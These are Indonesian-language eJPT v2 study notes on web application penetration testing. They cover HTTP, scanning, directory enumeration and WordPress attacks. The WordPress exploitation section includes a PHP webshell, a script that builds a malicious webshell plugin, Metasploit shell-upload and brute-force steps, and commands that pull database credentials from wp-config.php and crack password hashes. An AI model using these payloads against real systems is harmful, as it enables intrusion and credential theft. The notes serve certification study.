# Web Application Penetration Testing: Introduction to the Web & HTTP Protocol — eJPT v2

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin.

---

## Daftar Isi

1. [Introduction to Web Application Security](#1-introduction-to-web-application-security)
2. [Web Application Architecture & Components](#2-web-application-architecture--components)
3. [HTTP/S Protocol Fundamentals](#3-https-protocol-fundamentals)
4. [Website Crawling & Spidering](#4-website-crawling--spidering)
5. [Web Server Vulnerability Scanning](#5-web-server-vulnerability-scanning)
6. [File & Directory Enumeration](#6-file--directory-enumeration)
7. [CMS Security Testing](#7-cms-security-testing)

---

## 1. Introduction to Web Application Security

### 1.1 Introduction to Web Application Security

Web Application Security adalah praktik **melindungi aplikasi web** dari ancaman dan serangan yang dapat mengeksploitasi kerentanan di kode, konfigurasi, atau desain aplikasi.

```
Kenapa Web App Security Penting?

80%+ serangan siber menargetkan aplikasi web
Web app adalah "pintu depan" ke data dan sistem backend
Bug di kode = celah yang bisa dieksploitasi siapapun
```

### 1.2 Web Application Security Testing

Web application penetration testing adalah proses **menguji keamanan aplikasi web** secara sistematis untuk menemukan kerentanan sebelum penyerang menemukannya.

**Pendekatan Testing:**

| Pendekatan | Keterangan |
|---|---|
| **Black Box** | Tidak ada informasi awal — seperti attacker nyata |
| **White Box** | Akses penuh ke source code, dokumentasi |
| **Grey Box** | Sebagian informasi — akun user biasa |

**Metodologi Web App Testing:**

```
1. RECONNAISSANCE
   → Kumpulkan info: teknologi, endpoint, user
         ↓
2. SCANNING & ENUMERATION
   → Nikto, dirb, gobuster, Burp Suite spider
         ↓
3. VULNERABILITY IDENTIFICATION
   → Identifikasi kerentanan (SQLi, XSS, dll)
         ↓
4. EXPLOITATION
   → Eksploitasi kerentanan
         ↓
5. POST-EXPLOITATION
   → Eskalasi, pivot, persistence
         ↓
6. REPORTING
   → Dokumentasi temuan dan rekomendasi
```

### 1.3 Common Web Application Threats & Risks

**OWASP Top 10** adalah daftar 10 risiko keamanan web paling kritis:

| # | Risiko | Contoh |
|---|---|---|
| A01 | Broken Access Control | Akses halaman admin tanpa login |
| A02 | Cryptographic Failures | Password disimpan plaintext |
| A03 | **Injection** | SQL Injection, Command Injection |
| A04 | Insecure Design | Tidak ada rate limiting di login |
| A05 | Security Misconfiguration | Default credentials, directory listing |
| A06 | Vulnerable Components | Library dengan CVE yang belum di-patch |
| A07 | Auth Failures | Session tidak di-invalidate saat logout |
| A08 | Software & Data Integrity Failures | Update tanpa verifikasi signature |
| A09 | Logging Failures | Tidak ada log untuk aktivitas mencurigakan |
| A10 | SSRF | Server fetch URL yang dikontrol attacker |

**Ancaman yang Sering Keluar di eJPT:**

```
1. SQL Injection (SQLi)
   → Input user langsung masuk query SQL
   → Contoh: ' OR '1'='1

2. Cross-Site Scripting (XSS)
   → Inject script ke halaman web
   → Contoh: <script>alert(1)</script>

3. Command Injection
   → Eksekusi OS command via input
   → Contoh: ; whoami

4. File Inclusion (LFI/RFI)
   → Include file lokal/remote via parameter
   → Contoh: ?file=../../../../etc/passwd

5. Broken Authentication
   → Brute force, default credentials
   → Weak session management

6. Security Misconfiguration
   → Directory listing, info disclosure
   → Default credentials

7. File Upload Vulnerability
   → Upload webshell via form upload
```

---

## 2. Web Application Architecture & Components

### 2.1 Web Application Architecture

```
CLIENT SIDE                    SERVER SIDE
┌──────────────┐               ┌─────────────────────────────────┐
│              │   HTTP/HTTPS  │                                 │
│   Browser    │◄─────────────►│   Web Server (Apache/Nginx/IIS) │
│   (Firefox,  │               │         ↓                       │
│    Chrome)   │               │   Application Server            │
│              │               │   (PHP, Python, Java, Node.js)  │
└──────────────┘               │         ↓                       │
                               │   Database Server               │
                               │   (MySQL, MSSQL, PostgreSQL)    │
                               └─────────────────────────────────┘
```

**Komponen Utama:**

| Komponen | Fungsi | Contoh |
|---|---|---|
| Web Server | Melayani HTTP request | Apache, Nginx, IIS |
| App Server | Logika bisnis aplikasi | PHP, Python/Django, Java |
| Database | Menyimpan data | MySQL, PostgreSQL, MSSQL |
| CDN | Cache konten statis | Cloudflare, AWS CloudFront |
| Load Balancer | Distribusi traffic | HAProxy, F5 |
| WAF | Filter request berbahaya | ModSecurity, Cloudflare WAF |

**Three-Tier Architecture:**

```
Tier 1: Presentation   → Browser / Frontend (HTML, CSS, JS)
Tier 2: Application    → Backend Logic (PHP, Python, Java)
Tier 3: Data           → Database (MySQL, PostgreSQL)
```

### 2.2 Web Application Technologies - Part 1

**Frontend Technologies:**

```
HTML  → struktur halaman
CSS   → tampilan/styling
JavaScript → interaktivitas, logika client-side

Framework JS:
  React, Angular, Vue.js → Single Page Application (SPA)
  jQuery → manipulasi DOM
```

**Backend Technologies:**

| Bahasa | Framework | Ekstensi File |
|---|---|---|
| PHP | Laravel, CodeIgniter | .php |
| Python | Django, Flask | .py |
| Java | Spring, JSF | .jsp, .java |
| Ruby | Rails | .rb |
| Node.js | Express | .js |
| ASP.NET | .NET | .aspx, .asp |

**Cara Identifikasi Teknologi:**

```bash
# Dari HTTP headers
curl -I http://target.com
# X-Powered-By: PHP/7.4.3
# Server: Apache/2.4.41 (Ubuntu)

# Dari ekstensi file URL
/index.php     → PHP
/index.aspx    → ASP.NET
/index.jsp     → Java

# Tool otomatis
whatweb http://target.com
wappalyzer (browser extension)
```

### 2.3 Web Application Technologies - Part 2

**Database Technologies:**

| Database | Tipe | Ciri Khas |
|---|---|---|
| MySQL | Relational | Open source, paling umum |
| PostgreSQL | Relational | Advanced, open source |
| MSSQL | Relational | Microsoft, Windows |
| Oracle | Relational | Enterprise |
| MongoDB | NoSQL | Document-based, JSON |
| Redis | NoSQL | Key-value, in-memory |

**Web Server Technologies:**

```
Apache HTTP Server
  → .htaccess untuk konfigurasi per-direktori
  → Module-based
  → Port default: 80/443

Nginx
  → Reverse proxy, load balancer
  → Lebih efisien untuk konten statis
  → Port default: 80/443

Microsoft IIS
  → Windows only
  → Mendukung ASP.NET
  → Port default: 80/443
```

**CMS (Content Management System):**

```
WordPress  → PHP + MySQL, paling populer (~43% web)
Joomla     → PHP + MySQL
Drupal     → PHP + MySQL
Magento    → PHP + MySQL (e-commerce)
```

**Authentication & Session:**

```
Cookie-based Session:
  Browser → kirim request
  Server → buat session ID → kirim via Set-Cookie
  Browser → simpan cookie → kirim di setiap request

Token-based (JWT):
  Header.Payload.Signature
  Disimpan di localStorage atau cookie
  Stateless — server tidak perlu simpan session
```

---

## 3. HTTP/S Protocol Fundamentals

### 3.1 Introduction to HTTP

**HTTP (HyperText Transfer Protocol)** adalah protokol komunikasi antara client (browser) dan server.

```
Karakteristik HTTP:
→ Stateless    : setiap request independen, tidak ada "memori"
→ Text-based   : request dan response berupa teks
→ Port default : 80 (HTTP), 443 (HTTPS)
→ Request/Response model
```

**Versi HTTP:**

| Versi | Keterangan |
|---|---|
| HTTP/1.0 | Satu koneksi per request |
| HTTP/1.1 | Persistent connection, paling umum |
| HTTP/2 | Binary, multiplexing, lebih cepat |
| HTTP/3 | Berbasis QUIC (UDP) |

### 3.2 HTTP Requests - Part 1

**Struktur HTTP Request:**

```
METHOD /path HTTP/version
Header1: value1
Header2: value2

[Body — optional, untuk POST/PUT]
```

**Contoh GET Request:**

```http
GET /login.php?redirect=dashboard HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: session=abc123def456
```

**HTTP Methods:**

| Method | Fungsi | Contoh Penggunaan |
|---|---|---|
| **GET** | Ambil data | Buka halaman, fetch resource |
| **POST** | Kirim data | Submit form, login |
| **PUT** | Update data (replace) | Update profil |
| **PATCH** | Update data (partial) | Update sebagian field |
| **DELETE** | Hapus data | Hapus akun |
| **HEAD** | Sama seperti GET tapi tanpa body | Cek headers |
| **OPTIONS** | Lihat method yang tersedia | CORS preflight |
| **TRACE** | Echo request balik (debug) | Jarang dipakai |

### 3.3 HTTP Requests - Part 2

**HTTP Request Headers Penting:**

| Header | Fungsi |
|---|---|
| `Host` | Domain target (wajib di HTTP/1.1) |
| `User-Agent` | Identitas browser/client |
| `Cookie` | Kirim cookie ke server |
| `Authorization` | Credentials (Basic, Bearer token) |
| `Content-Type` | Tipe data di body request |
| `Content-Length` | Panjang body request |
| `Referer` | URL halaman sebelumnya |
| `X-Forwarded-For` | IP asli di balik proxy |
| `Origin` | Origin request (CORS) |

**Contoh POST Request (Form Login):**

```http
POST /login.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Cookie: PHPSESSID=abc123

username=admin&password=password123
```

**Contoh POST Request (JSON API):**

```http
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 45

{"username": "admin", "password": "password123"}
```

**URL Encoding:**

```
Karakter spesial di URL harus di-encode:
space → %20
&     → %26
=     → %3D
'     → %27
"     → %22
<     → %3C
>     → %3E
/     → %2F

Contoh:
admin' OR '1'='1 → admin%27%20OR%20%271%27%3D%271
```

### 3.4 HTTP Responses

**Struktur HTTP Response:**

```
HTTP/version STATUS_CODE Reason
Header1: value1
Header2: value2

[Body — HTML, JSON, dll]
```

**Contoh HTTP Response:**

```http
HTTP/1.1 200 OK
Date: Mon, 30 May 2026 10:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/7.4.3
Content-Type: text/html; charset=UTF-8
Set-Cookie: PHPSESSID=xyz789; path=/; HttpOnly
Content-Length: 1234

<!DOCTYPE html>
<html>...
```

**HTTP Status Codes:**

| Code | Kategori | Keterangan |
|---|---|---|
| **1xx** | Informational | Processing |
| **2xx** | Success | Request berhasil |
| 200 | OK | Request sukses |
| 201 | Created | Resource dibuat |
| 204 | No Content | Sukses, tidak ada body |
| **3xx** | Redirection | Redirect ke URL lain |
| 301 | Moved Permanently | Redirect permanen |
| 302 | Found | Redirect sementara |
| **4xx** | Client Error | Error dari client |
| 400 | Bad Request | Request tidak valid |
| 401 | Unauthorized | Butuh autentikasi |
| 403 | Forbidden | Akses ditolak |
| 404 | Not Found | Resource tidak ada |
| 405 | Method Not Allowed | Method tidak diizinkan |
| **5xx** | Server Error | Error di server |
| 500 | Internal Server Error | Error di kode server |
| 503 | Service Unavailable | Server tidak tersedia |

**HTTP Response Headers Penting (Security):**

| Header | Fungsi |
|---|---|
| `Set-Cookie` | Set cookie di browser |
| `X-Powered-By` | Teknologi yang digunakan (info disclosure!) |
| `Server` | Versi web server (info disclosure!) |
| `Content-Security-Policy` | Kontrol resource yang bisa dimuat |
| `X-Frame-Options` | Cegah clickjacking |
| `Strict-Transport-Security` | Force HTTPS |
| `X-XSS-Protection` | Proteksi XSS bawaan browser |

> **Catatan Pentesting:** Header `X-Powered-By` dan `Server` bisa memberikan informasi versi yang berguna untuk mencari exploit!

### 3.5 HTTP Basics Lab - Part 1

**Tools untuk Analisis HTTP:**

```bash
# ─── CURL ───────────────────────────────────────────────────

# GET request dasar
curl http://target.com

# Tampilkan headers saja
curl -I http://target.com

# Tampilkan headers + body
curl -iv http://target.com

# POST request
curl -X POST http://target.com/login \
  -d "username=admin&password=admin123"

# POST dengan JSON
curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'

# Kirim cookie
curl http://target.com -H "Cookie: session=abc123"

# Ikuti redirect
curl -L http://target.com

# Simpan response ke file
curl http://target.com -o output.html

# Verbose output (lihat semua detail)
curl -v http://target.com

# Ignore SSL certificate error
curl -k https://target.com
```

### 3.6 HTTP Basics Lab - Part 2

```bash
# ─── WGET ───────────────────────────────────────────────────

# Download file
wget http://target.com/file.pdf

# Download dengan nama berbeda
wget http://target.com/file.pdf -O /tmp/downloaded.pdf

# Download secara recursive (crawl website)
wget -r http://target.com

# ─── BURP SUITE PROXY ───────────────────────────────────────

# Setup proxy di browser:
# HTTP Proxy: 127.0.0.1 Port: 8080

# Intercept request:
# Proxy → Intercept → ON
# Buka website di browser → request tertangkap di Burp

# Forward request setelah diedit:
# Edit parameter → Forward

# Kirim ke Repeater untuk testing berulang:
# Klik kanan request → Send to Repeater
# Ctrl+R → kirim ulang

# ─── HTTP DENGAN PYTHON ─────────────────────────────────────

python3 << 'EOF'
import requests

# GET request
response = requests.get('http://target.com')
print(response.status_code)
print(response.headers)
print(response.text)

# POST request
data = {'username': 'admin', 'password': 'admin123'}
response = requests.post('http://target.com/login', data=data)
print(response.status_code)
print(response.cookies)
EOF
```

### 3.7 HTTPS

**HTTPS = HTTP + TLS/SSL Encryption**

```
HTTP  → data dikirim plaintext → bisa disadap!
HTTPS → data dienkripsi dengan TLS → aman

Port HTTP  : 80
Port HTTPS : 443
```

**Cara Kerja TLS Handshake:**

```
Client                          Server
  │                               │
  │──── Client Hello ────────────►│ (versi TLS, cipher suites)
  │                               │
  │◄─── Server Hello ─────────────│ (pilih cipher, kirim cert)
  │                               │
  │──── Client Key Exchange ─────►│ (versi pre-master secret)
  │                               │
  │◄═══════ Encrypted Data ═══════│ (komunikasi terenkripsi)
```

**SSL/TLS Certificate:**

```
Certificate berisi:
→ Domain name (Common Name / SAN)
→ Issuer (CA yang menandatangani)
→ Valid period (Not Before / Not After)
→ Public key

Cek certificate dengan curl:
curl -v https://target.com 2>&1 | grep -A 10 "Server certificate"

Cek dengan nmap:
nmap --script=ssl-cert -p 443 target.com
```

**HTTPS dalam Pentesting:**

```bash
# Tools yang menangani HTTPS otomatis:
curl -k https://target.com          # -k = ignore cert error
burp suite                          # intercept HTTPS traffic
nikto -h https://target.com         # scan HTTPS

# Cek konfigurasi SSL/TLS
nmap --script=ssl-enum-ciphers -p 443 target.com
sslscan target.com
testssl.sh target.com
```

---

## 4. Website Crawling & Spidering

### Passive Crawling & Spidering with Burp Suite & OWASP ZAP

**Crawling/Spidering** = proses otomatis untuk **menemukan semua halaman, endpoint, dan parameter** di sebuah website.

```
Spider/Crawler mengikuti semua link:
  / → /about → /contact → /login → /dashboard
            ↓
  Peta lengkap semua URL di website
```

#### Burp Suite Spider/Crawler

```
# Setup:
1. Set browser proxy: 127.0.0.1:8080
2. Buka Burp Suite → Proxy → Intercept OFF
3. Browse website secara manual
4. Semua request otomatis masuk ke Burp

# Passive Crawling (dari traffic yang sudah ada):
Target → Site Map → klik kanan domain → Spider this host

# Active Crawling:
Target → Site Map → klik kanan → Actively scan this host

# Hasil:
Target → Site Map
→ Lihat semua URL yang ditemukan
→ Lihat parameter GET/POST
→ Lihat response tiap endpoint
```

**Fitur Burp Suite yang Penting:**

| Fitur | Fungsi |
|---|---|
| **Proxy** | Intercept dan edit HTTP request |
| **Spider** | Crawl otomatis semua halaman |
| **Scanner** | Scan kerentanan otomatis (Pro) |
| **Repeater** | Kirim ulang dan edit request |
| **Intruder** | Fuzzing dan brute force |
| **Decoder** | Encode/decode URL, Base64, dll |
| **Comparer** | Bandingkan dua response |

#### OWASP ZAP Spider

```bash
# Jalankan ZAP
zaproxy &

# Via GUI:
# Quick Start → Automated Scan → masukkan URL → Attack

# Via command line:
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com

# Spider saja:
zap-cli spider http://target.com

# Active scan:
zap-cli active-scan http://target.com

# Generate report:
zap-cli report -o report.html -f html
```

**Perbedaan Passive vs Active Crawling:**

| | Passive | Active |
|---|---|---|
| Cara | Monitor traffic yang ada | Kirim request baru |
| Deteksi | Lebih sulit dideteksi | Lebih mudah dideteksi |
| Kelengkapan | Terbatas pada yang di-browse | Lebih lengkap |
| Risiko | Minimal | Ada risiko crash app |

---

## 5. Web Server Vulnerability Scanning

### Web Server Scanning with Nikto

**Nikto** adalah web server scanner yang mendeteksi:
- Software yang outdated
- File/direktori berbahaya
- Konfigurasi yang salah
- Plugin/script yang rentan

```bash
# ─── BASIC SCAN ─────────────────────────────────────────────

nikto -h http://target.com
nikto -h https://target.com          # HTTPS
nikto -h target.com -p 8080          # port custom

# ─── SCAN OPTIONS ───────────────────────────────────────────

# Scan lebih lengkap
nikto -h http://target.com -C all    # cek semua CGI direktori

# Scan dengan autentikasi
nikto -h http://target.com -id admin:password

# Scan dengan cookie
nikto -h http://target.com -c "session=abc123"

# Scan dengan proxy (Burp Suite)
nikto -h http://target.com -useproxy http://127.0.0.1:8080

# Scan port tertentu
nikto -h target.com -p 80,443,8080,8443

# ─── OUTPUT ─────────────────────────────────────────────────

# Simpan ke file
nikto -h http://target.com -o output.txt
nikto -h http://target.com -o output.html -Format htm
nikto -h http://target.com -o output.xml -Format xml

# ─── TUNING ─────────────────────────────────────────────────

# -Tuning x = jenis test tertentu
# 1 = Interesting File / Seen in logs
# 2 = Misconfiguration / Default File
# 3 = Information Disclosure
# 4 = Injection (XSS/Script/HTML)
# 5 = Remote File Retrieval - Inside Web Root
# 6 = Denial of Service
# 8 = Command Execution / Remote Shell
# 9 = SQL Injection

nikto -h http://target.com -Tuning 4    # hanya XSS
nikto -h http://target.com -Tuning 9    # hanya SQLi
```

**Contoh Output Nikto:**

```
- Nikto v2.1.6
+ Target IP:          10.10.10.1
+ Target Hostname:    target.com
+ Target Port:        80
+ Server: Apache/2.4.41 (Ubuntu)
+ X-Powered-By: PHP/7.4.3 ← info disclosure!
+ /admin/: Admin login page/area found.
+ /backup/: Directory indexing found.
+ /config.php.bak: PHP backup file found!
+ OSVDB-3268: /uploads/: Directory indexing enabled.
+ Apache/2.4.41 appears to be outdated
```

**Yang Dicari dari Nikto:**

```
✓ Versi software yang outdated → cari CVE
✓ Directory listing enabled → bisa lihat isi folder
✓ File backup (.bak, .old, .zip) → berisi source code
✓ Admin/config page exposed → coba default credentials
✓ Info disclosure headers → versi PHP, server
```

---

## 6. File & Directory Enumeration

### File & Directory Brute-Force

**Tujuan:** Menemukan file dan direktori tersembunyi yang tidak ada di navigasi website.

```
Website hanya tampilkan: /home, /about, /contact
Tapi sebenarnya ada:
  /admin          → panel admin
  /backup         → file backup
  /config.php     → file konfigurasi
  /uploads        → folder upload
  /.git           → repository git!
  /phpinfo.php    → info PHP
```

#### Gobuster

```bash
# ─── DIRECTORY BRUTE FORCE ──────────────────────────────────

# Basic scan
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Dengan ekstensi file
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html,bak,zip

# Scan HTTPS (ignore cert error)
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -k

# Dengan auth
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -U admin -P password

# Dengan cookie
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -c "session=abc123"

# Tambah threads (lebih cepat)
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -t 50

# Filter status code
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -s 200,204,301,302,307,403

# Simpan output
gobuster dir -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -o output.txt

# ─── DNS BRUTE FORCE ────────────────────────────────────────

gobuster dns -d target.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# ─── VHOST BRUTE FORCE ──────────────────────────────────────

gobuster vhost -u http://target.com \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### Dirb

```bash
# Basic scan
dirb http://target.com

# Dengan wordlist custom
dirb http://target.com /usr/share/wordlists/dirb/big.txt

# Dengan ekstensi
dirb http://target.com -X .php,.txt,.bak

# Scan HTTPS
dirb https://target.com

# Dengan auth
dirb http://target.com -u admin:password

# Non-recursive
dirb http://target.com -r

# Simpan output
dirb http://target.com -o output.txt
```

#### Feroxbuster

```bash
# Fast recursive directory brute-force
feroxbuster -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt

# Dengan ekstensi
feroxbuster -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html

# Recursive dengan depth
feroxbuster -u http://target.com \
  -w /usr/share/wordlists/dirb/common.txt \
  --depth 3
```

**Wordlist yang Direkomendasikan:**

```bash
# Basic (cepat)
/usr/share/wordlists/dirb/common.txt          # ~4000 entries

# Medium
/usr/share/wordlists/dirb/big.txt             # ~20000 entries

# Large (lambat tapi lengkap)
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# SecLists (paling lengkap)
/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

**File yang Wajib Dicari:**

```
robots.txt         → daftar path yang "dilarang" (justru menarik!)
sitemap.xml        → peta semua halaman
.git/              → repository git → source code!
.env               → environment variables (API keys, password!)
config.php         → konfigurasi database
wp-config.php      → WordPress config
phpinfo.php        → info PHP + path + konfigurasi
backup.zip/.tar    → backup file
admin/             → panel admin
login/             → halaman login
api/               → API endpoints
```

---

## 7. CMS Security Testing

### 7.1 Introduction to CMS Security Testing

**CMS (Content Management System)** adalah platform untuk membuat dan mengelola konten web tanpa coding.

**Kenapa CMS Menjadi Target:**

```
1. Sangat populer → banyak digunakan → banyak target
2. Plugin/theme pihak ketiga → sumber kerentanan
3. Banyak instalasi tidak di-update
4. Default configuration sering tidak aman
5. CVE baru ditemukan terus-menerus
```

**Cara Identifikasi CMS:**

```bash
# WhatWeb
whatweb http://target.com

# Wappalyzer (browser extension)

# Manual — cari file khas:
curl http://target.com/wp-login.php        # WordPress
curl http://target.com/administrator/      # Joomla
curl http://target.com/user/login          # Drupal

# Meta tag di source HTML
curl http://target.com | grep -i "generator"
# <meta name="generator" content="WordPress 6.0" />
```

### 7.2 Introduction to WordPress Security Testing

WordPress digunakan oleh **43%+ website di internet** — target yang sangat umum.

**Struktur WordPress:**

```
/wp-admin/          → dashboard admin ← selalu ada!
/wp-login.php       → halaman login
/wp-content/        → tema dan plugin
/wp-content/themes/ → tema yang diinstall
/wp-content/plugins/→ plugin yang diinstall
/wp-includes/       → core WordPress
/wp-config.php      → konfigurasi (JANGAN ACCESSIBLE!)
/xmlrpc.php         → XML-RPC API (sering dieksploit)
```

#### WPScan — WordPress Vulnerability Scanner

```bash
# ─── BASIC SCAN ─────────────────────────────────────────────

wpscan --url http://target.com

# ─── ENUMERATE ──────────────────────────────────────────────

# Enumerate users
wpscan --url http://target.com -e u

# Enumerate plugins
wpscan --url http://target.com -e p

# Enumerate themes
wpscan --url http://target.com -e t

# Enumerate semua
wpscan --url http://target.com -e u,p,t,vp,vt

# ─── BRUTE FORCE ────────────────────────────────────────────

# Brute force password user yang ditemukan
wpscan --url http://target.com \
  -U admin \
  -P /usr/share/wordlists/rockyou.txt

# Brute force multiple users
wpscan --url http://target.com \
  -U users.txt \
  -P /usr/share/wordlists/rockyou.txt

# ─── API TOKEN (lebih banyak info CVE) ──────────────────────

wpscan --url http://target.com \
  --api-token <YOUR_TOKEN> \
  -e vp,vt,u

# ─── OPSI TAMBAHAN ──────────────────────────────────────────

# Bypass WAF (random user agent)
wpscan --url http://target.com --random-user-agent

# Scan HTTPS (ignore cert)
wpscan --url https://target.com --disable-tls-checks

# Verbose output
wpscan --url http://target.com -v

# Simpan output
wpscan --url http://target.com -o output.txt
```

**Contoh Output WPScan:**

```
[+] URL: http://target.com/
[+] WordPress version 5.8.1 identified ← versi lama!
[+] WordPress theme in use: twentytwenty
[i] User(s) Identified:
  [+] admin
  [+] editor
[!] 3 vulnerabilities identified:
  [!] Plugin: contact-form-7 4.9
      Vulnerability: Unrestricted File Upload
      CVE: CVE-2020-35489
```

**Kerentanan WordPress yang Umum:**

```
1. Outdated Core/Plugin/Theme
   → Cari CVE → exploit dengan MSF atau manual

2. Weak Credentials
   → admin/admin, admin/password
   → Brute force dengan WPScan

3. xmlrpc.php enabled
   → Brute force tanpa rate limiting
   → Bisa enumerate users

4. File Upload vulnerability di plugin
   → Upload PHP webshell

5. Directory traversal di plugin
   → Baca file di luar web root

6. SQL Injection di plugin/theme
   → Dump database
```

### 7.3 Exploiting WordPress

#### Cara Eksploitasi WordPress

**Metode 1 — Exploit Plugin Vulnerable:**

```bash
# Cari CVE plugin yang ditemukan WPScan
searchsploit <plugin_name>
searchsploit wordpress contact form 7

# Via Metasploit
search wordpress
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password123
set TARGETURI /
run
```

**Metode 2 — Upload Webshell via Admin (jika dapat akses admin):**

```
1. Login ke wp-admin
2. Appearance → Theme Editor
3. Pilih file tema (misal: 404.php)
4. Edit → tambahkan PHP webshell:
   <?php system($_GET['cmd']); ?>
5. Update File
6. Akses: http://target.com/wp-content/themes/<theme>/404.php?cmd=whoami
```

**Metode 3 — Malicious Plugin Upload:**

```bash
# Buat plugin berbahaya
mkdir evil-plugin
cat > evil-plugin/evil-plugin.php << 'EOF'
<?php
/*
Plugin Name: Evil Plugin
*/
system($_GET['cmd']);
EOF

# Zip plugin
zip -r evil-plugin.zip evil-plugin/

# Upload via wp-admin:
# Plugins → Add New → Upload Plugin → pilih evil-plugin.zip
# Activate Plugin
# Akses: http://target.com/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=id
```

**Metode 4 — Brute Force + MSF Shell:**

```bash
# Step 1: Enumerate user dengan WPScan
wpscan --url http://target.com -e u

# Step 2: Brute force password
wpscan --url http://target.com -U admin -P rockyou.txt

# Step 3: Setelah dapat credentials → upload shell via MSF
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password123
run
```

**Metode 5 — xmlrpc.php Exploitation:**

```bash
# Cek apakah xmlrpc aktif
curl http://target.com/xmlrpc.php
# Response: "XML-RPC server accepts POST requests only"

# Brute force via xmlrpc (bypass rate limiting)
use auxiliary/scanner/http/wordpress_xmlrpc_login
set RHOSTS target.com
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

**Post-Exploitation Setelah Dapat Shell WordPress:**

```bash
# Cek lokasi wp-config.php → credentials database
cat /var/www/html/wp-config.php | grep -E "DB_NAME|DB_USER|DB_PASSWORD|DB_HOST"

# Contoh output:
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'wpuser');
# define('DB_PASSWORD', 'SecretPass123');
# define('DB_HOST', 'localhost');

# Login ke database
mysql -u wpuser -pSecretPass123 wordpress

# Dump semua user WordPress (hash password)
SELECT user_login, user_pass FROM wp_users;

# Hash WordPress = MD5 yang dimodifikasi
# Crack dengan hashcat
hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Quick Reference

### Alur Web App Pentesting

```
1. Fingerprint teknologi
   whatweb, curl -I, Wappalyzer
         ↓
2. Crawl/Spider website
   Burp Suite, OWASP ZAP
         ↓
3. Scan web server
   nikto -h http://target.com
         ↓
4. Enumerate direktori
   gobuster dir -u http://target.com -w wordlist.txt
         ↓
5. Identifikasi CMS
   wpscan (WordPress), joomscan (Joomla)
         ↓
6. Cari kerentanan
   searchsploit, MSF search, CVE database
         ↓
7. Eksploitasi
   MSF, manual exploit, webshell upload
```

### Command Penting

```bash
# Fingerprint
whatweb http://target.com
curl -I http://target.com

# Scan
nikto -h http://target.com
nmap --script=http-enum -p 80 target.com

# Directory enum
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
dirb http://target.com

# WordPress
wpscan --url http://target.com -e u,vp,vt
wpscan --url http://target.com -U admin -P rockyou.txt

# HTTP manual
curl -v http://target.com
curl -X POST http://target.com/login -d "user=admin&pass=admin"

# Burp Suite proxy
# Browser → 127.0.0.1:8080
```

### HTTP Status Codes Penting

```
200 → OK (halaman ada)
301 → Redirect permanen
302 → Redirect sementara
401 → Butuh autentikasi
403 → Forbidden (ada tapi tidak boleh akses)
404 → Not Found
500 → Server Error (mungkin ada bug!)
```

### Lokasi File Sensitif WordPress

```
/wp-config.php          → database credentials
/wp-admin/              → panel admin
/wp-login.php           → login page
/xmlrpc.php             → XML-RPC (exploit vector)
/wp-content/uploads/    → file yang diupload
/wp-content/plugins/    → plugin (sumber kerentanan)
```

---

*Dibuat untuk studi eJPT v2 — Web Application Penetration Testing*
*Gunakan hanya di lingkungan yang telah mendapat izin*
